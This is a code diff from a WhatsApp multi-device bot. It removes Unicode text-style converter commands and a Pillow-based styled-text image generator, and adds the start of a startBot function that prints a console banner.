-    await X.sendMessage(m.chat, { react: { text: '💱', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}currency [text]`)
-const curMap={a:'₳',b:'฿',c:'₵',d:'₫',e:'€',f:'₣',g:'₲',h:'♄',i:'ł',j:'ʝ',k:'₭',l:'₤',m:'₥',n:'₦',o:'ø',p:'₱',q:'q',r:'®',s:'$',t:'₮',u:'µ',v:'√',w:'₩',x:'×',y:'¥',z:'z',A:'₳',B:'฿',C:'₵',D:'₫',E:'€',F:'₣',G:'₲',H:'♄',I:'ł',J:'ʝ',K:'₭',L:'₤',M:'₥',N:'₦',O:'ø',P:'₱',Q:'Q',R:'®',S:'$',T:'₮',U:'µ',V:'√',W:'₩',X:'×',Y:'¥',Z:'Z'}
-reply([...ftIn].map(c=>curMap[c]||c).join(''))
-} break
-
-case 'dotted': {
-    await X.sendMessage(m.chat, { react: { text: '·', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}dotted [text]`)
-const dotMap={a:'ȧ',b:'ḃ',c:'ċ',d:'ḋ',e:'ė',f:'ḟ',g:'ġ',h:'ḣ',i:'ı',j:'j',k:'k',l:'l',m:'ṁ',n:'ṅ',o:'ȯ',p:'ṗ',q:'q',r:'ṙ',s:'ṡ',t:'ṫ',u:'u',v:'v',w:'ẇ',x:'ẋ',y:'ẏ',z:'ż',A:'Ȧ',B:'Ḃ',C:'Ċ',D:'Ḋ',E:'Ė',F:'Ḟ',G:'Ġ',H:'Ḣ',I:'İ',J:'J',K:'K',L:'L',M:'Ṁ',N:'Ṅ',O:'Ȯ',P:'Ṗ',Q:'Q',R:'Ṙ',S:'Ṡ',T:'Ṫ',U:'U',V:'V',W:'Ẇ',X:'Ẋ',Y:'Ẏ',Z:'Ż'}
-reply([...ftIn].map(c=>dotMap[c]||c).join(''))
-} break
-
-case 'oldeng': {
-    await X.sendMessage(m.chat, { react: { text: '📜', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}oldeng [text]`)
-const oengMap={a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'}
-reply([...ftIn].map(c=>oengMap[c]||c).join(''))
-} break
-
-case 'allfonts': {
-    await X.sendMessage(m.chat, { react: { text: '🔤', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let ftIn = text || (m.quoted && (m.quoted.text || m.quoted.body || m.quoted.caption || '').trim()) || ''
-if (!ftIn) return reply(`Usage: ${prefix}allfonts [text]`)
-const maps = {
-  'Bold Sans':       {a:'𝗮',b:'𝗯',c:'𝗰',d:'𝗱',e:'𝗲',f:'𝗳',g:'𝗴',h:'𝗵',i:'𝗶',j:'𝗷',k:'𝗸',l:'𝗹',m:'𝗺',n:'𝗻',o:'𝗼',p:'𝗽',q:'𝗾',r:'𝗿',s:'𝘀',t:'𝘁',u:'𝘂',v:'𝘃',w:'𝘄',x:'𝘅',y:'𝘆',z:'𝘇',A:'𝗔',B:'𝗕',C:'𝗖',D:'𝗗',E:'𝗘',F:'𝗙',G:'𝗚',H:'𝗛',I:'𝗜',J:'𝗝',K:'𝗞',L:'𝗟',M:'𝗠',N:'𝗡',O:'𝗢',P:'𝗣',Q:'𝗤',R:'𝗥',S:'𝗦',T:'𝗧',U:'𝗨',V:'𝗩',W:'𝗪',X:'𝗫',Y:'𝗬',Z:'𝗭'},
-  'Italic Sans':     {a:'𝘢',b:'𝘣',c:'𝘤',d:'𝘥',e:'𝘦',f:'𝘧',g:'𝘨',h:'𝘩',i:'𝘪',j:'𝘫',k:'𝘬',l:'𝘭',m:'𝘮',n:'𝘯',o:'𝘰',p:'𝘱',q:'𝘲',r:'𝘳',s:'𝘴',t:'𝘵',u:'𝘶',v:'𝘷',w:'𝘸',x:'𝘹',y:'𝘺',z:'𝘻',A:'𝘈',B:'𝘉',C:'𝘊',D:'𝘋',E:'𝘌',F:'𝘍',G:'𝘎',H:'𝘏',I:'𝘐',J:'𝘑',K:'𝘒',L:'𝘓',M:'𝘔',N:'𝘕',O:'𝘖',P:'𝘗',Q:'𝘘',R:'𝘙',S:'𝘚',T:'𝘛',U:'𝘜',V:'𝘝',W:'𝘞',X:'𝘟',Y:'𝘠',Z:'𝘡'},
-  'Bold Italic':     {a:'𝙖',b:'𝙗',c:'𝙘',d:'𝙙',e:'𝙚',f:'𝙛',g:'𝙜',h:'𝙝',i:'𝙞',j:'𝙟',k:'𝙠',l:'𝙡',m:'𝙢',n:'𝙣',o:'𝙤',p:'𝙥',q:'𝙦',r:'𝙧',s:'𝙨',t:'𝙩',u:'𝙪',v:'𝙫',w:'𝙬',x:'𝙭',y:'𝙮',z:'𝙯',A:'𝘼',B:'𝘽',C:'𝘾',D:'𝘿',E:'𝙀',F:'𝙁',G:'𝙂',H:'𝙃',I:'𝙄',J:'𝙅',K:'𝙆',L:'𝙇',M:'𝙈',N:'𝙉',O:'𝙊',P:'𝙋',Q:'𝙌',R:'𝙍',S:'𝙎',T:'𝙏',U:'𝙐',V:'𝙑',W:'𝙒',X:'𝙓',Y:'𝙔',Z:'𝙕'},
-  'Mono':            {a:'𝚊',b:'𝚋',c:'𝚌',d:'𝚍',e:'𝚎',f:'𝚏',g:'𝚐',h:'𝚑',i:'𝚒',j:'𝚓',k:'𝚔',l:'𝚕',m:'𝚖',n:'𝚗',o:'𝚘',p:'𝚙',q:'𝚚',r:'𝚛',s:'𝚜',t:'𝚝',u:'𝚞',v:'𝚟',w:'𝚠',x:'𝚡',y:'𝚢',z:'𝚣',A:'𝙰',B:'𝙱',C:'𝙲',D:'𝙳',E:'𝙴',F:'𝙵',G:'𝙶',H:'𝙷',I:'𝙸',J:'𝙹',K:'𝙺',L:'𝙻',M:'𝙼',N:'𝙽',O:'𝙾',P:'𝙿',Q:'𝚀',R:'𝚁',S:'𝚂',T:'𝚃',U:'𝚄',V:'𝚅',W:'𝚆',X:'𝚇',Y:'𝚈',Z:'𝚉'},
-  'Script':          {a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'},
-  'Bold Script':     {a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩'},
-  'Fraktur':         {a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝔄',B:'𝔅',C:'ℭ',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝔍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝔒',P:'𝔓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝔙',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'},
-  'Bold Fraktur':    {a:'𝖆',b:'𝖇',c:'𝖈',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝖍',i:'𝖎',j:'𝖏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝖝',y:'𝖞',z:'𝖟',A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅'},
-  'Double Struck':   {a:'𝕒',b:'𝕓',c:'𝕔',d:'𝕕',e:'𝕖',f:'𝕗',g:'𝕘',h:'𝕙',i:'𝕚',j:'𝕛',k:'𝕜',l:'𝕝',m:'𝕞',n:'𝕟',o:'𝕠',p:'𝕡',q:'𝕢',r:'𝕣',s:'𝕤',t:'𝕥',u:'𝕦',v:'𝕧',w:'𝕨',x:'𝕩',y:'𝕪',z:'𝕫',A:'𝔸',B:'𝔹',C:'ℂ',D:'𝔻',E:'𝔼',F:'𝔽',G:'𝔾',H:'ℍ',I:'𝕀',J:'𝕁',K:'𝕂',L:'𝕃',M:'𝕄',N:'ℕ',O:'𝕆',P:'ℙ',Q:'ℚ',R:'ℝ',S:'𝕊',T:'𝕋',U:'𝕌',V:'𝕍',W:'𝕎',X:'𝕏',Y:'𝕐',Z:'ℤ'},
-  'Small Caps':      {a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ꜰ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'Q',r:'ʀ',s:'ꜱ',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ',A:'ᴀ',B:'ʙ',C:'ᴄ',D:'ᴅ',E:'ᴇ',F:'ꜰ',G:'ɢ',H:'ʜ',I:'ɪ',J:'ᴊ',K:'ᴋ',L:'ʟ',M:'ᴍ',N:'ɴ',O:'ᴏ',P:'ᴘ',Q:'Q',R:'ʀ',S:'ꜱ',T:'ᴛ',U:'ᴜ',V:'ᴠ',W:'ᴡ',X:'x',Y:'ʏ',Z:'ᴢ'},
-  'Bubble':          {a:'ⓐ',b:'ⓑ',c:'ⓒ',d:'ⓓ',e:'ⓔ',f:'ⓕ',g:'ⓖ',h:'ⓗ',i:'ⓘ',j:'ⓙ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'ⓞ',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'ⓧ',y:'ⓨ',z:'ⓩ',A:'Ⓐ',B:'Ⓑ',C:'Ⓒ',D:'Ⓓ',E:'Ⓔ',F:'Ⓕ',G:'Ⓖ',H:'Ⓗ',I:'Ⓘ',J:'Ⓙ',K:'Ⓚ',L:'Ⓛ',M:'Ⓜ',N:'Ⓝ',O:'Ⓞ',P:'Ⓟ',Q:'Ⓠ',R:'Ⓡ',S:'Ⓢ',T:'Ⓣ',U:'Ⓤ',V:'Ⓥ',W:'Ⓦ',X:'Ⓧ',Y:'Ⓨ',Z:'Ⓩ'},
-  'Wide':            {},
-  'Medieval':        {a:'\u{1D51E}',b:'\u{1D51F}',c:'\u{1D520}',d:'\u{1D521}',e:'\u{1D522}',f:'\u{1D523}',g:'\u{1D524}',h:'\u{1D525}',i:'\u{1D526}',j:'\u{1D527}',k:'\u{1D528}',l:'\u{1D529}',m:'\u{1D52A}',n:'\u{1D52B}',o:'\u{1D52C}',p:'\u{1D52D}',q:'\u{1D52E}',r:'\u{1D52F}',s:'\u{1D530}',t:'\u{1D531}',u:'\u{1D532}',v:'\u{1D533}',w:'\u{1D534}',x:'\u{1D535}',y:'\u{1D536}',z:'\u{1D537}',A:'\u{1D504}',B:'\u{1D505}',C:'\u212D',D:'\u{1D507}',E:'\u{1D508}',F:'\u{1D509}',G:'\u{1D50A}',H:'\u210C',I:'\u2111',J:'\u{1D50D}',K:'\u{1D50E}',L:'\u{1D50F}',M:'\u{1D510}',N:'\u{1D511}',O:'\u{1D512}',P:'\u{1D513}',Q:'\u{1D514}',R:'\u211C',S:'\u{1D516}',T:'\u{1D517}',U:'\u{1D518}',V:'\u{1D519}',W:'\u{1D51A}',X:'\u{1D51B}',Y:'\u{1D51C}',Z:'\u2128'},
-  'Cursive':         {a:'\u{1D4EA}',b:'\u{1D4EB}',c:'\u{1D4EC}',d:'\u{1D4ED}',e:'\u{1D4EE}',f:'\u{1D4EF}',g:'\u{1D4F0}',h:'\u{1D4F1}',i:'\u{1D4F2}',j:'\u{1D4F3}',k:'\u{1D4F4}',l:'\u{1D4F5}',m:'\u{1D4F6}',n:'\u{1D4F7}',o:'\u{1D4F8}',p:'\u{1D4F9}',q:'\u{1D4FA}',r:'\u{1D4FB}',s:'\u{1D4FC}',t:'\u{1D4FD}',u:'\u{1D4FE}',v:'\u{1D4FF}',w:'\u{1D500}',x:'\u{1D501}',y:'\u{1D502}',z:'\u{1D503}',A:'\u{1D4D0}',B:'\u{1D4D1}',C:'\u{1D4D2}',D:'\u{1D4D3}',E:'\u{1D4D4}',F:'\u{1D4D5}',G:'\u{1D4D6}',H:'\u{1D4D7}',I:'\u{1D4D8}',J:'\u{1D4D9}',K:'\u{1D4DA}',L:'\u{1D4DB}',M:'\u{1D4DC}',N:'\u{1D4DD}',O:'\u{1D4DE}',P:'\u{1D4DF}',Q:'\u{1D4E0}',R:'\u{1D4E1}',S:'\u{1D4E2}',T:'\u{1D4E3}',U:'\u{1D4E4}',V:'\u{1D4E5}',W:'\u{1D4E6}',X:'\u{1D4E7}',Y:'\u{1D4E8}',Z:'\u{1D4E9}'},
-  'Aesthetic':       {a:'ａ',b:'ｂ',c:'ｃ',d:'ｄ',e:'ｅ',f:'ｆ',g:'ｇ',h:'ｈ',i:'ｉ',j:'ｊ',k:'ｋ',l:'ｌ',m:'ｍ',n:'ｎ',o:'ｏ',p:'ｐ',q:'ｑ',r:'ｒ',s:'ｓ',t:'ｔ',u:'ｕ',v:'ｖ',w:'ｗ',x:'ｘ',y:'ｙ',z:'ｚ',A:'Ａ',B:'Ｂ',C:'Ｃ',D:'Ｄ',E:'Ｅ',F:'Ｆ',G:'Ｇ',H:'Ｈ',I:'Ｉ',J:'Ｊ',K:'Ｋ',L:'Ｌ',M:'Ｍ',N:'Ｎ',O:'Ｏ',P:'Ｐ',Q:'Ｑ',R:'Ｒ',S:'Ｓ',T:'Ｔ',U:'Ｕ',V:'Ｖ',W:'Ｗ',X:'Ｘ',Y:'Ｙ',Z:'Ｚ'},
-  'Tiny':            {a:'ᵃ',b:'ᵇ',c:'ᶜ',d:'ᵈ',e:'ᵉ',f:'ᶠ',g:'ᵍ',h:'ʰ',i:'ⁱ',j:'ʲ',k:'ᵏ',l:'ˡ',m:'ᵐ',n:'ⁿ',o:'ᵒ',p:'ᵖ',q:'q',r:'ʳ',s:'ˢ',t:'ᵗ',u:'ᵘ',v:'ᵛ',w:'ʷ',x:'ˣ',y:'ʸ',z:'ᶻ',A:'ᴬ',B:'ᴮ',C:'ᶜ',D:'ᴰ',E:'ᴱ',F:'ᶠ',G:'ᴳ',H:'ᴴ',I:'ᴵ',J:'ᴶ',K:'ᴷ',L:'ᴸ',M:'ᴹ',N:'ᴺ',O:'ᴼ',P:'ᴾ',Q:'Q',R:'ᴿ',S:'ˢ',T:'ᵀ',U:'ᵁ',V:'ᵛ',W:'ᵂ',X:'ˣ',Y:'ʸ',Z:'ᶻ'},
-  'Inverted':        {a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ƃ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'l',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',A:'∀',B:'q',C:'Ɔ',D:'p',E:'Ǝ',F:'Ⅎ',G:'פ',H:'H',I:'I',J:'ɾ',K:'ʞ',L:'˥',M:'W',N:'N',O:'O',P:'Ԁ',Q:'Q',R:'ɹ',S:'S',T:'┴',U:'∩',V:'Λ',W:'M',X:'X',Y:'ʎ',Z:'Z'},
-  'Mirror':          {a:'ɒ',b:'d',c:'ɔ',d:'b',e:'ɘ',f:'ʇ',g:'ϱ',h:'ʜ',i:'i',j:'ᴉ',k:'ʞ',l:'l',m:'m',n:'n',o:'o',p:'q',q:'p',r:'ɿ',s:'ƨ',t:'ƚ',u:'u',v:'v',w:'w',x:'x',y:'y',z:'z',A:'A',B:'ᗺ',C:'Ɔ',D:'ᗡ',E:'Ǝ',F:'ꟻ',G:'Ꭾ',H:'H',I:'I',J:'Ꮈ',K:'ꓘ',L:'⅃',M:'M',N:'И',O:'O',P:'ꟼ',Q:'Ọ',R:'Я',S:'Ƨ',T:'T',U:'U',V:'V',W:'W',X:'X',Y:'Y',Z:'Z'},
-  'Currency':        {a:'₳',b:'฿',c:'₵',d:'₫',e:'€',f:'₣',g:'₲',h:'♄',i:'ł',j:'ʝ',k:'₭',l:'₤',m:'₥',n:'₦',o:'ø',p:'₱',q:'q',r:'®',s:'$',t:'₮',u:'µ',v:'√',w:'₩',x:'×',y:'¥',z:'z',A:'₳',B:'฿',C:'₵',D:'₫',E:'€',F:'₣',G:'₲',H:'♄',I:'ł',J:'ʝ',K:'₭',L:'₤',M:'₥',N:'₦',O:'ø',P:'₱',Q:'Q',R:'®',S:'$',T:'₮',U:'µ',V:'√',W:'₩',X:'×',Y:'¥',Z:'Z'},
-  'Dotted':          {a:'ȧ',b:'ḃ',c:'ċ',d:'ḋ',e:'ė',f:'ḟ',g:'ġ',h:'ḣ',i:'ı',j:'j',k:'k',l:'l',m:'ṁ',n:'ṅ',o:'ȯ',p:'ṗ',q:'q',r:'ṙ',s:'ṡ',t:'ṫ',u:'u',v:'v',w:'ẇ',x:'ẋ',y:'ẏ',z:'ż',A:'Ȧ',B:'Ḃ',C:'Ċ',D:'Ḋ',E:'Ė',F:'Ḟ',G:'Ġ',H:'Ḣ',I:'İ',J:'J',K:'K',L:'L',M:'Ṁ',N:'Ṅ',O:'Ȯ',P:'Ṗ',Q:'Q',R:'Ṙ',S:'Ṡ',T:'Ṫ',U:'U',V:'V',W:'Ẇ',X:'Ẋ',Y:'Ẏ',Z:'Ż'},
-  'Old English':     {a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'},
-  'Parenthesis':    {a:'⒜',b:'⒝',c:'⒞',d:'⒟',e:'⒠',f:'⒡',g:'⒢',h:'⒣',i:'⒤',j:'⒥',k:'⒦',l:'⒧',m:'⒨',n:'⒩',o:'⒪',p:'⒫',q:'⒬',r:'⒭',s:'⒮',t:'⒯',u:'⒰',v:'⒱',w:'⒲',x:'⒳',y:'⒴',z:'⒵',A:'⒜',B:'⒝',C:'⒞',D:'⒟',E:'⒠',F:'⒡',G:'⒢',H:'⒣',I:'⒤',J:'⒥',K:'⒦',L:'⒧',M:'⒨',N:'⒩',O:'⒪',P:'⒫',Q:'⒬',R:'⒭',S:'⒮',T:'⒯',U:'⒰',V:'⒱',W:'⒲',X:'⒳',Y:'⒴',Z:'⒵'},
-  'Flags':          {a:'🇦',b:'🇧',c:'🇨',d:'🇩',e:'🇪',f:'🇫',g:'🇬',h:'🇭',i:'🇮',j:'🇯',k:'🇰',l:'🇱',m:'🇲',n:'🇳',o:'🇴',p:'🇵',q:'🇶',r:'🇷',s:'🇸',t:'🇹',u:'🇺',v:'🇻',w:'🇼',x:'🇽',y:'🇾',z:'🇿',A:'🇦',B:'🇧',C:'🇨',D:'🇩',E:'🇪',F:'🇫',G:'🇬',H:'🇭',I:'🇮',J:'🇯',K:'🇰',L:'🇱',M:'🇲',N:'🇳',O:'🇴',P:'🇵',Q:'🇶',R:'🇷',S:'🇸',T:'🇹',U:'🇺',V:'🇻',W:'🇼',X:'🇽',Y:'🇾',Z:'🇿'}
-}
-let out = ''
-for (let [name, map] of Object.entries(maps)) {
-  if (name === 'Wide') {
-    let w = [...ftIn].map(c=>{let code=c.charCodeAt(0);return (code>=33&&code<=126)?String.fromCharCode(code+65248):c==' '?'　':c}).join('')
-    out += `*${name}:*\n${w}\n\n`
-  } else if (Object.keys(map).length === 0) {
-    out += ''
-  } else {
-    out += `*${name}:*\n${[...ftIn].map(c=>map[c]||c).join('')}\n\n`
-  }
-}
-reply(out.trim())
-} break
-
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Text Maker Commands (using Pollinations image generation)
-case 'metallic':
-case 'ice':
-case 'snow':
-case 'impressive':
-case 'matrix':
-case 'light':
-case 'neon':
-case 'devil':
-case 'purple':
-case 'thunder':
-case 'leaves':
-case '1917':
-case 'arena':
-case 'hacker':
-case 'sand':
-case 'blackpink':
-case 'glitch':
-case 'fire': {
-    await X.sendMessage(m.chat, { react: { text: '🔥', key: m.key } })
-let _tmRaw = text || (m.quoted && (m.quoted.text || m.quoted.caption || m.quoted.body || '').trim()) || ''
-// Strip any "*Xxx Text:*" or "Text:*" prefixes from quoted bot replies to prevent nesting
-let tmText = _tmRaw.replace(/^(\*[\w\s]+ Text:\*\s*)+/i, '').replace(/^(Text:\*\s*)+/i, '').trim()
-if (!tmText) return reply(`Example: ${prefix}${command} Your Text Here\n_Or reply to a message containing the text_`)
-
-const _label = command.charAt(0).toUpperCase() + command.slice(1)
-const _caption = `*${_label} Text:* ${tmText}`
-
-// ── Style configs: bg RGB, font (sans/mono/serif), layers [{ox,oy,r,g,b}], blur ──
-const _tmStyles = {
-    metallic: { bg:[18,18,30],  font:'sans',  layers:[[6,6,34,34,51],[4,4,68,68,85],[2,2,136,136,153],[1,1,187,187,204],[0,0,232,232,248]] },
-    ice:      { bg:[3,8,24],    font:'sans',  layers:[[6,6,0,17,51],[4,4,0,51,102],[2,2,0,85,170],[1,1,68,170,221],[0,0,170,238,255]] },
-    snow:     { bg:[200,216,240],font:'sans', layers:[[5,5,136,153,187],[3,3,170,187,221],[1,1,204,221,240],[0,0,255,255,255]] },
-    impressive:{ bg:[13,8,0],   font:'sans',  layers:[[7,7,61,32,0],[5,5,122,64,0],[3,3,204,136,0],[1,1,255,204,0],[0,0,255,240,170]] },
-    matrix:   { bg:[0,8,0],     font:'mono',  layers:[[5,5,0,20,0],[3,3,0,68,0],[1,1,0,170,0],[0,0,0,255,65]] },
-    light:    { bg:[0,0,16],    font:'sans',  layers:[[-6,-6,68,68,0],[-4,-4,136,136,0],[-2,-2,204,204,0],[6,6,68,68,0],[4,4,136,136,0],[2,2,204,204,0],[0,0,255,255,204]], blur:1 },
-    neon:     { bg:[5,0,26],    font:'sans',  layers:[[6,0,170,0,136],[-6,0,170,0,136],[0,6,170,0,136],[0,-6,170,0,136],[4,4,204,0,204],[-4,-4,204,0,204],[0,0,255,136,255]], blur:1 },
-    devil:    { bg:[16,0,0],    font:'sans',  layers:[[7,7,51,0,0],[5,5,102,0,0],[3,3,170,0,0],[1,1,221,34,0],[0,0,255,85,51]] },
-    purple:   { bg:[8,0,16],    font:'sans',  layers:[[6,6,17,0,51],[4,4,51,0,102],[2,2,102,0,204],[1,1,153,51,255],[0,0,204,153,255]] },
-    thunder:  { bg:[5,5,16],    font:'sans',  layers:[[6,6,34,34,0],[4,4,102,102,0],[2,2,170,170,0],[1,1,255,255,0],[0,0,255,255,170]], blur:1 },
-    leaves:   { bg:[0,21,0],    font:'sans',  layers:[[6,6,0,26,0],[4,4,0,51,0],[2,2,17,102,0],[1,1,51,170,0],[0,0,136,238,68]] },
-    '1917':   { bg:[26,16,8],   font:'serif', layers:[[5,5,42,26,8],[3,3,107,68,32],[1,1,170,119,68],[0,0,212,169,106]] },
-    arena:    { bg:[16,8,0],    font:'sans',  layers:[[7,7,42,16,0],[5,5,106,40,0],[3,3,204,85,0],[1,1,255,136,0],[0,0,255,204,136]] },
-    hacker:   { bg:[0,3,0],     font:'mono',  layers:[[3,3,0,34,0],[1,1,0,102,0],[0,0,0,255,0]] },
-    sand:     { bg:[26,16,5],   font:'serif', layers:[[6,6,58,42,16],[4,4,122,90,40],[2,2,192,144,80],[1,1,212,170,112],[0,0,238,221,153]] },
-    blackpink:{ bg:[10,0,10],   font:'sans',  layers:[[6,6,51,0,51],[4,4,136,0,68],[2,2,204,0,102],[1,1,255,68,170],[0,0,255,187,221]] },
-    glitch:   { bg:[0,0,16],    font:'mono',  layers:[[-5,0,255,0,0],[5,0,0,255,255],[0,0,255,255,255]] },
-    fire:     { bg:[13,2,0],    font:'sans',  layers:[[7,7,51,0,0],[5,5,136,17,0],[3,3,204,68,0],[2,2,255,102,0],[1,1,255,170,0],[0,0,255,238,136]] },
 }
 
-const _sty = _tmStyles[command] || _tmStyles.fire
-const _fs = require('fs')
-const _path = require('path')
-const _os = require('os')
-const _outFile = _path.join(_os.tmpdir(), `tm_${Date.now()}.jpg`)
+async function startBot() {
+    console.log('')
+    console.log(`${c.cyan}${c.bold}╔══════════════════════════════════════════╗${c.r}`)
+    console.log(`${c.cyan}${c.bold}║${c.r}  ${c.green}${c.bold}⚡ TOOSII-XD ULTRA${c.r} ${c.yellow}v2.0.0${c.r}             ${c.cyan}${c.bold}║${c.r}`)
+    console.log(`${c.cyan}${c.bold}║${c.r}  ${c.white}${c.bold}   WhatsApp Multi-Device Bot${c.r}          ${c.cyan}${c.bold}║${c.r}`)
+    console.log(`${c.cyan}${c.bold}║${c.r}  ${c.magenta}     by Toosii Tech © 2024-2026${c.r}     ${c.cyan}${c.bold}║${c.r}`)
+    console.log(`${c.cyan}${c.bold}╚══════════════════════════════════════════╝${c.r}`)
+    console.log('')
 
-// Build a self-contained Python script — no PATH issues, Pillow works everywhere
-const _safeText = tmText.replace(/\\/g, '').replace(/'/g, "\\'").replace(/\n/g, ' ').trim().slice(0, 80)
-const _layersJson = JSON.stringify(_sty.layers)
-const _bgJson = JSON.stringify(_sty.bg)
-const _fontType = _sty.font
-const _blur = _sty.blur || 0
-
-const _pyScript = `
-import sys, os
-
-# Auto-install Pillow if not available
-try:
-    from PIL import Image, ImageDraw, ImageFont, ImageFilter
-except ImportError:
-    import subprocess
-    subprocess.run([sys.executable, '-m', 'pip', 'install', 'Pillow', '--quiet', '--user'], check=True)
-    from PIL import Image, ImageDraw, ImageFont, ImageFilter
-
-W, H = 1024, 400
-text = '${_safeText}'
-font_type = '${_fontType}'
-bg = tuple(${_bgJson})
-layers = ${_layersJson}
-blur = ${_blur}
-out = '${_outFile.replace(/\\/g, '/')}'
-
-FONTS = {
-    'sans':  '/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf',
-    'mono':  '/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf',
-    'serif': '/usr/share/fonts/truetype/dejavu/DejaVuSerif-Bold.ttf',
-}
